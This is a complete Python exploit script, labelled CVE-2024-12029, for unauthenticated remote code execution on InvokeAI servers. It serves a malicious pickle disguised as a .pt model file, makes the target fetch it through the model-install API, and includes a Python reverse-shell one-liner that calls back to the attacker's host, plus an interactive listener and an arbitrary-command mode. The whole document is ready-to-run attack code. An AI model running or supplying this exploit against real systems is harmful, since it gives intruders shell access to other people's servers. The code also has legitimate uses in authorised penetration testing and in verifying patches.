### CVE-2024-12029

import requests
import json
import http.server
import os
import socketserver
import pickle
import threading
import time
import argparse
import socket
import select
import sys
import subprocess

class RCE:
    def __init__(self, command):
        self.command = command
    
    def __reduce__(self):
        return (os.system, (self.command,))

class MaliciousHTTPHandler(http.server.SimpleHTTPRequestHandler):
    """
    A custom HTTP request handler that serves the raw pickle payload.
    """
    def __init__(self, *args, **kwargs):
        self.pickle_payload = kwargs.pop('pickle_payload', b'')
        self.exploit_instance = kwargs.pop('exploit_instance', None)
        super().__init__(*args, **kwargs)

    def do_GET(self):
        print(f"[+] Malicious server received GET request for: {self.path}")
        if self.path.endswith(".pt") or self.path.endswith(".ckpt"):
            self.send_response(200)
            self.send_header("Content-Type","application/octet-stream")
            self.send_header("Content-Length",str(len(self.pickle_payload)))
            self.end_headers()
            self.wfile.write(self.pickle_payload)
            print("[+] Raw RCE payload (CKPT/PT) served successfully.")
            if self.exploit_instance:
                self.exploit_instance.payload_served = True
        else:
            self.send_error(404, "Go home. We are not serving files today")

class NetcatListener:
    """
    A simple Netcat-like listener to catch reverse shells.
    Provides basic interactivity by piping stdin to the client socket and
    client socket data to stdout.
    """
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.listener_socket = None
        self.client_socket = None
        self.server_thread = None
        self.stop_event = threading.Event()
        self.connection_established = threading.Event()

    def handle_client(self, client_conn, client_addr):
        print(f"\n[+] Reverse shell connection established from {client_addr[0]}:{client_addr[1]}")
        self.client_socket = client_conn
        self.connection_established.set() 

        self.client_socket.settimeout(0.1)

        upgrade_commands = [
            f"sleep 1;python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n", 
            f"export TERM=xterm\n",
            f"export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:$PATH\n",
            f"clear\n" 
        ]

        original_stty_settings = None
        try:
            original_stty_settings = subprocess.check_output(['stty', '-g']).strip()
            subprocess.run(['stty', 'raw', '-echo'], check=True)
            print("[*] Local terminal set to raw mode. Use Ctrl+D to exit shell.")
        except subprocess.CalledProcessError as e:
            print(f"[-] Could not set local terminal to raw mode (stty error: {e}). Interaction might be clunky.")
            print("    Consider running 'stty raw -echo' manually in your terminal after connection.")
        except FileNotFoundError:
            print("[-] 'stty' command not found. Cannot set local terminal to raw mode. Interaction might be clunky.")

        try:
            for cmd in upgrade_commands:
                try:
                    self.client_socket.sendall(cmd.encode('utf-8'))
                    time.sleep(0.1)
                except Exception as e:
                    print(f"[-] Error sending upgrade command '{cmd.strip()}': {e}")

            inputs = [self.client_socket, sys.stdin]
            while not self.stop_event.is_set():
                readable, _, _ = select.select(inputs, [], [], 0.5) 
                
                for sock in readable:
                    if sock == self.client_socket:
                        try:
                            data = self.client_socket.recv(4096)
                            if not data:
                                raise ConnectionAbortedError("Client disconnected")
                            sys.stdout.write(data.decode('utf-8', errors='ignore'))
                            sys.stdout.flush()
                        except socket.timeout:
                            pass 
                        except (ConnectionResetError, ConnectionAbortedError):
                            print("\n[*] Reverse shell client disconnected.")
                            self.stop_event.set()
                            break 
                    elif sock == sys.stdin:
                        line = sys.stdin.read(1) 
                        if line:
                            self.client_socket.sendall(line.encode('utf-8'))

        except Exception as e:
            if not self.stop_event.is_set(): 
                print(f"\n[-] Error during interactive shell session: {e}")
        finally:
            if original_stty_settings:
                try:
                    subprocess.run(['stty', original_stty_settings], check=True)
                    print("[*] Local terminal stty settings restored.")
                except Exception as e:
                    print(f"[-] Error restoring stty settings: {e}")
            if self.client_socket:
                self.client_socket.close()
                self.client_socket = None
            print("[*] Reverse shell session ended.")


    def start(self):
        try:
            self.listener_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.listener_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.listener_socket.bind((self.host, self.port))
            self.listener_socket.listen(1)
            print(f"[+] Listening for reverse shell on {self.host}:{self.port}")

            self.server_thread = threading.Thread(target=self._accept_connections)
            self.server_thread.daemon = True
            self.server_thread.start()
            return True
        except Exception as e:
            print(f"[-] Failed to start listener on {self.host}:{self.port}: {e}")
            return False

    def _accept_connections(self):
        while not self.stop_event.is_set():
            try:
                self.listener_socket.settimeout(1)
                conn, addr = self.listener_socket.accept()
                if self.client_socket or self.stop_event.is_set():
                    conn.close()
                    continue
                self.handle_client(conn, addr)
                self.stop_event.set()
            except socket.timeout:
                continue
            except Exception as e:
                if not self.stop_event.is_set(): 
                    print(f"[-] Error accepting connection: {e}")
                self.stop_event.set() 

    def stop(self):
        self.stop_event.set()
        if self.listener_socket:
            print("[*] Stopping Netcat listener.")
            self.listener_socket.close()
        if self.server_thread and self.server_thread.is_alive():
            self.server_thread.join(timeout=2) 
        if self.client_socket:
            self.client_socket.close()
            self.client_socket = None 

    def wait_for_connection(self, timeout=30):
        print(f"[*] Waiting for reverse shell connection for up to {timeout} seconds...")
        self.connection_established.wait(timeout) 
        return self.connection_established.is_set()


class InvokeAIExploit:
    def __init__(self, invoke_ai_srv, invoke_ai_port, srvhost, hosting_port, listener_port, command):
        self.command = command
        self.http_server_thread = None 
        self.pickle_payload = None
        self.httpd = None
        self.payload_served = False
        self.srvhost = srvhost
        self.hosting_port = hosting_port
        self.listener_port = listener_port 
        self.invoke_ai_srv = invoke_ai_srv
        self.invoke_ai_port = invoke_ai_port
        self.domain = f"{self.invoke_ai_srv}:{self.invoke_ai_port}"
        self.netcat_listener = NetcatListener(self.srvhost, self.listener_port) 

    def check_version(self):
        try: 
            res = requests.get(self.domain+'/api/v1/app/version')
            res.raise_for_status()
            json_data = res.json()
            version = json_data.get('version')
            print(f"Current InvokeAI Version: {version}")
            print('Vulnerable versions: 4.0.0 to 5.4.2')
        except requests.exceptions.RequestException as e:
            print(f'[-] Couldn\'t get InvokeAI version: {e}. Target might be down or inaccessible.')
            return False
        return True

    def start_malicious_http_server(self):
        malicious_object = RCE(self.command)
        self.pickle_payload = pickle.dumps(malicious_object, protocol=pickle.HIGHEST_PROTOCOL)
        
        if self.pickle_payload is None:
            print("[-] Error: self.pickle_payload was not set after creating pickle.")
            return False

        handler_with_args = lambda *args, **kwargs: MaliciousHTTPHandler(
            *args, pickle_payload=self.pickle_payload, exploit_instance=self, **kwargs
        )
        try:
            self.httpd = socketserver.TCPServer((self.srvhost, self.hosting_port), handler_with_args)
            self.http_server_thread = threading.Thread(target=self.httpd.serve_forever)
            self.http_server_thread.daemon = True
            self.http_server_thread.start()
            print(f"[+] Malicious HTTP server started on http://{self.srvhost}:{self.hosting_port}/model.pt")
            return True
        except Exception as e:
            print(f"[-] Failed to start HTTP Server on {self.srvhost}:{self.hosting_port}: {e}")
            return False

    def stop_malicious_http_server(self):
        if self.httpd:
            print("[*] Stopping HTTP server")
            self.httpd.shutdown()
            self.httpd.server_close()

    def send_install_request(self):
        params = {
            'source': f"http://{self.srvhost}:{self.hosting_port}/model.pt", 
            'inplace': 'true'
        }
        headers = {'content-type':'application/json'}
        data = json.dumps({})
        print(f"[+] Sending install request to {self.domain}/api/v2/models/install with source {params['source']}")
        try:
            res = requests.post(self.domain+'/api/v2/models/install', params=params, headers=headers, data=data, timeout=15)
            res.raise_for_status() 
            if res.status_code == 201:
                print('[+] Install request sent successfully (status 201 Created).')
            else:
                print(f"[-] Install request unexpected error with status {res.status_code}. Response text: {res.text}")
                return False
        except requests.exceptions.RequestException as e:
            print(f"[-] Failed to send install request: {e}")
            return False
        return True

    def exploit(self):
        print('[*] Starting InvokeAI Exploit...')
        if not self.check_version():
            print("[-] Version check failed or target not vulnerable/reachable. Exiting.")
            return

        is_reverse_shell_op = "python3" in self.command and "/bin/bash" in self.command and str(self.listener_port) in self.command

        try:
            if is_reverse_shell_op:
                print('[*] Starting Netcat Listener (for reverse shell) and HTTP Server (for payload delivery).')
                if not self.netcat_listener.start():
                    print('[-] Failed to start Netcat Listener. Exiting.')
                    return
            else:
                print('[*] Starting HTTP Server (for command execution payload delivery).')

            if not self.start_malicious_http_server():
                print('[-] Failed to start HTTP Server. Exiting.')
                if is_reverse_shell_op:
                    self.netcat_listener.stop() 
                return

            if not self.send_install_request():
                print('[-] Failed to send install request. Exiting.')
                self.stop_malicious_http_server()
                if is_reverse_shell_op:
                    self.netcat_listener.stop()
                return

            print("[*] Waiting for target to fetch our payload...")
            
            start_time = time.time()
            max_wait_time = 30
            
            while not self.payload_served and (time.time() - start_time < max_wait_time):
                time.sleep(1)
            
            if self.payload_served:
                print("[+] Raw RCE payload (CKPT/PT) fetched by target!")
                if is_reverse_shell_op:
                    remaining_wait_time = max_wait_time - (time.time() - start_time)
                    if remaining_wait_time > 0:
                        if self.netcat_listener.wait_for_connection(timeout=remaining_wait_time):
                            print("[+] Reverse shell connection received! Interacting with shell...")
                            while not self.netcat_listener.stop_event.is_set():
                                time.sleep(0.5)
                        else:
                            print("[-] No reverse shell connection received within timeout after payload was fetched.")
                    else:
                        print("[-] Overall timeout reached before reverse shell connection.")
                else:
                    print("[*] Command execution payload delivered. Check target for command output/effect.")
                    time.sleep(5) 
            else:
                print("[-] Payload was not fetched by the target within timeout.")

        except KeyboardInterrupt:
            print("\n[*] Exploit interrupted by user. Cleaning up...")
        except Exception as e:
            print(f"[-] An unexpected error occurred during exploit: {e}")
        finally:
            print("[*] Cleaning up resources...")
            self.stop_malicious_http_server()
            if is_reverse_shell_op: 
                self.netcat_listener.stop()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="InvokeAI RCE Exploit with interactive command selection.")
    parser.add_argument('--invoke-ai-port', type=int, default=9090, 
                        help='Port for InvokeAI server (default: 9090).')
    parser.add_argument('--invoke-ai-srv', type=str, required=True, 
                        help='InvokeAI server URL (e.g., http://192.168.102.212).')
    parser.add_argument('--hosting-srv', type=str, required=True, 
                        help='Your local IP address where the malicious HTTP server will run AND the reverse shell will connect back to (e.g., 192.168.45.174).')
    parser.add_argument('--hosting-port', type=int, default=8090, 
                        help='Your local port for the malicious HTTP server (default: 8090).')
    parser.add_argument('--listener-port', type=int, default=9001, 
                        help='Your local port for the reverse shell listener (default: 9001). MUST BE DIFFERENT from --hosting-port.')


    args = parser.parse_args()

    if args.hosting_port == args.listener_port:
        print("Error: --hosting-port and --listener-port must be different.")
        sys.exit(1)
    
    try:
        socket.gethostbyname(args.hosting_srv)
    except socket.gaierror:
        print(f"Error: --hosting-srv '{args.hosting_srv}' is not a valid hostname or IP address.")
        sys.exit(1)

    chosen_command = ""
    rev_shell_template = "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{host}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'"

    while True:
        print("\n--- Choose Operation ---")
        print("1) Reverse Shell (Python3 payload with TTY spawn and env setup)")
        print("2) Command Execution (provide custom command)")
        choice = input("Enter choice (1 or 2): ").strip()

        if choice == '1':
            chosen_command = rev_shell_template.format(host=args.hosting_srv, port=args.listener_port)
            print(f"\n[+] Generated Reverse Shell Command: {chosen_command}")
            break
        elif choice == '2':
            chosen_command = input("Enter the command to execute on the target: ").strip()
            if not chosen_command:
                print("[-] Command cannot be empty. Please enter a valid command.")
                continue
            print(f"\n[+] Command for execution: {chosen_command}")
            break
        else:
            print("[-] Invalid choice. Please enter '1' or '2'.")

    exploit = InvokeAIExploit(
        invoke_ai_srv=args.invoke_ai_srv,
        invoke_ai_port=args.invoke_ai_port,
        srvhost=args.hosting_srv,
        hosting_port=args.hosting_port,
        listener_port=args.listener_port,
        command=chosen_command 
    )

    exploit.exploit()